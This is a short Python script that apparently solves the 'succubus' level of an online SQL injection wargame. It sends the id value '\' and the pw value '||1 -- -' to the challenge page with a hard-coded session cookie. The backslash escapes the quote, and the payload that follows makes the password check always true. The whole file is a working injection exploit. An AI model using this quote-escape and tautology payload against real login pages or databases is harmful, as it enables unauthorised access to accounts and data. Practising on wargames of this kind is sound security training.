import requests


def get(id, pw):
    return requests.get(
        'https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php',
        params={"id":id, "pw":pw},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get just have id
print(get("\\", '||1 -- -'))